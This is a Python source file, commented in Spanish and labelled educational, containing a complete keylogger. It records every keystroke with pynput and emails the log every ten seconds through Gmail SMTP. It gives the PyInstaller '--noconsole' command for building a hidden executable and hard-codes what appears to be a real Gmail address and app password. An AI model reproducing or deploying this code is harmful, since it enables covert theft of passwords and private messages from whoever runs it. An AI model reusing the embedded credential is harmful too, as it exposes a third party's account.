# -- coding: utf-8 --
# -----------------------------------------------------------------------------
# KEYLOGGER CON FINES EDUCATIVOS
# -----------------------------------------------------------------------------
# Este script demuestra cómo capturar pulsaciones de teclas y enviarlas por correo electrónico periódicamente.

# -----------------------------------------------------------------------------
# REQUISITOS Y BIBLIOTECAS NECESARIAS
# -----------------------------------------------------------------------------
# 1. Bibliotecas externas (requieren instalación manual por consola):
#    - pynput: para monitorear y capturar los eventos del teclado.
#    - pyinstaller: herramienta para empaquetar el script en un ejecutable (.exe).
#
#    Comando para instalar ambas en una sola línea:
#    pip install pynput pyinstaller
#
# 2. Módulos nativos (incluidos por defecto en la Librería Estándar de Python):
#    Nota: NO deben instalarse con pip, ya vienen integrados al instalar Python.
#    - smtplib: para la conexión y envío de correos mediante protocolo SMTP/TLS.
#    - threading (Timer): para ejecutar tareas en segundo plano de forma periódica.
#    - datetime: para obtener y dar formato a la fecha y hora del sistema.


# Pyinstaller es una herramienta que convierte scripts Python en ejecutables .exe para Windows.
# pyinstaller --onefile --noconsole keylogger.py 
# -----------------------------------------------------------------------------


import pynput.keyboard # Librería para capturar las pulsaciones de teclas
import smtplib # Librería para enviar correos electrónicos 
from threading import Timer # Librería para ejecutar funciones periódicamente 
import datetime # Librería para manejar fechas y horas 
# -----------------------------------------------------------------------------

# --- CONFIGURACIÓN ---
# Cambia estos valores por tus credenciales y preferencias.
EMAIL_REMITENTE = "josealgomgar007@gmail.com"  # Tu correo de Gmail
PASSWORD_APP = "zofb khom mvtc otdj "    # Tu contraseña de aplicación de Google
INTERVALO_SEGUNDOS = 10  # Intervalo en segundos para enviar el correo

# --------------------------------------------------------------



#Enlace para creaer tu contraseña de aplicación
# https://accounts.google.com/v3/signin/challenge/pwd?TL=APps6ebToPShw2MgtPpl5o8Gf_MEjvP-VuRiIRANeZFS826pvf8o57E1osuEWkvo&cid=3&continue=https%3A%2F%2Fmyaccount.google.com%2Fapppasswords&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmyaccount.google.com%2Fapppasswords&ifkv=ARpgrqdcx_YkwQQ0cQzvWPIkC4dfT-YdI5oaMwJDpFNMfYeUK71rEs_BYSa6PbrbsIiajht0qP5S-g&osid=1&rart=ANgoxccmLrGwT0jLnixcQCWUN2pFLZEbdpRzYJ5X1iNZrSflPmQexok6GHVXenaROOpMNyAqlNrVAiLjO02_t9X_OujghgUP0MVwmiOsPwXSpjjDvANMYXk&rpbg=1&service=accountsettings


# --- VARIABLES GLOBALES ---
# Almacena las teclas capturadas entre intervalos de envío.
log_teclas = ""

def tecla_presionada(tecla):
    """
    Esta función se llama cada vez que se presiona una tecla.
    Convierte la tecla en un carácter legible y lo añade al log global.
    """
    global log_teclas
    try:
        # Añade el carácter de la tecla al log.
        log_teclas += tecla.char
    except AttributeError:
        # Maneja las teclas especiales para mejor legibilidad, como espacio, enter y tab.
        if tecla == pynput.keyboard.Key.space:
            log_teclas += " " 
        elif tecla == pynput.keyboard.Key.enter:
            log_teclas += "\n[ENTER]\n" 
        elif tecla == pynput.keyboard.Key.tab:
             log_teclas += " [TAB] "
        else:
            # Para otras teclas especiales, añade su nombre entre corchetes.
            # Evita fallos si str(tecla) devuelve formatos inesperados
            nombre_tecla = str(tecla).replace("Key.", "").upper()
            log_teclas += f" [{nombre_tecla}] "

def enviar_correo(email, password, mensaje):
    """
    Conecta con el servidor SMTP de Gmail y envía el correo con el log.
    Ahora incluye un asunto y cuerpo formateados con marca de tiempo.
    """
    servidor_smtp = "smtp.gmail.com" # Servidor SMTP de Gmail
    puerto = 587 # Puerto para TLS, que es más seguro que SSL

    # TLS (Transport Layer Security) es un protocolo que asegura la comunicación por internet.
    # Usar TLS ayuda a proteger tus credenciales y el contenido del correo durante la transmisión.
    # SSL es otro protocolo de seguridad, pero TLS es más moderno y generalmente preferido para correos electrónicos.
    # SSL es usado para conexiones como HTTPS en navegadores web.

      
    # GENERAR MARCA DE TIEMPO (TIMESTAMP) 
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") # Formato de fecha y hora actual
    
    # FORMATO DE MENSAJE (ASUNTO Y CUERPO) 
    asunto = f"Nuevo Log Capturado - {timestamp}"
    cuerpo = f"""
    --- REPORTE ---
    
    Fecha y Hora: {timestamp}
     
    ========================================
    {mensaje}
    """
    # El mensaje debe estar codificado para SMTP
    mensaje_completo = f"Subject: {asunto}\n\n{cuerpo}" 
    
    try:
        print(f"\nIntentando conectar al servidor SMTP de Gmail...")
        # Se añade timeout de 10 segundos para evitar que el script se congele
        server = smtplib.SMTP(servidor_smtp, puerto, timeout=10)
        server.starttls()
        server.login(email, password)
        
        # Envía el correo.
        server.sendmail(email, email, mensaje_completo.encode('utf-8'))
        
        return True
    except Exception as e:
        # Captura fallos de red, contraseñas incorrectas o caídas de servidor
        print(f"Error crítico al enviar el correo: {e}")
        return False
    finally:
        # Garantiza que la conexión se cierre SIEMPRE,
        # incluso si el código falló a mitad del proceso. Evita fugas de memoria.
        if server:
            try:
                server.quit()
            except Exception:
                pass

def reportar_y_enviar():
    """
    Función principal del hilo. Controla el flujo del temporizador,
    evita el desbordamiento de memoria y gestiona caracteres seguros.
    """
    global log_teclas
    
    # Cláusula de guardar
    # Si no hay nada que enviar, programamos el siguiente ciclo de inmediato y salimos.
    if not log_teclas:
        Timer(INTERVALO_SEGUNDOS, reportar_y_enviar).start()
        return

    print("\n[REPORTE] Se han capturado nuevas teclas. Preparando envío formateado...")
    
    # Protección de memoria (mitigación de desbordamiento)
    # Si el log supera los 50,000 caracteres (por falta de internet prolongada), se recorta.
    MAX_CARACTERES = 50000
    texto_a_enviar = log_teclas
    if len(texto_a_enviar) > MAX_CARACTERES:
        texto_a_enviar = texto_a_enviar[:MAX_CARACTERES] + "\n\n[LOG RECORTADO POR EXCESO DE TAMAÑO]"

    # Convertimos a caracteres legibles ignorando errores de bytes extraños que rompan SMTP
    texto_seguro = texto_a_enviar.encode('utf-8', errors='ignore').decode('utf-8')
    
    envio_exitoso = enviar_correo(EMAIL_REMITENTE, PASSWORD_APP, texto_seguro)
    
    if envio_exitoso:
        print("¡Correo con el registro enviado exitosamente!")
    
        # Solo removemos lo que ya enviamos con éxito, por si el usuario tecleó mientras se enviaba.
        log_teclas = log_teclas[len(texto_a_enviar):]
    else:
        print("El envío falló. Se conservarán los datos para el próximo intento.")

    print(f"\n[ESTADO ACTIVO] Próxima revisión en {INTERVALO_SEGUNDOS} segundos.")
    
    # El temporizador se ejecuta pase lo que pase para mantener el programa vivo
    Timer(INTERVALO_SEGUNDOS, reportar_y_enviar).start()

def iniciar_keylogger():
    """
    Inicia el listener de teclado y el ciclo de reportes.
    """
    print("--- Keylogger Educativo Iniciado ---")
    print(f"Se enviará un reporte formateado cada {INTERVALO_SEGUNDOS} segundos al correo: {EMAIL_REMITENTE}")
    print("Presiona Ctrl+C en esta consola para detener el programa.")
    
    # Inicia el ciclo de envío de correos por primera vez
    reportar_y_enviar()
    
    # Crea el listener que escuchará las pulsaciones de teclado.
    with pynput.keyboard.Listener(on_press=tecla_presionada) as listener: 
        listener.join()

# --- Punto de Entrada del Programa ---
if __name__ == "__main__":
    try:
        iniciar_keylogger()
    except KeyboardInterrupt:
        print("\nPrograma detenido por el usuario.")

#El escroll del mouse no se registra en este keylogger.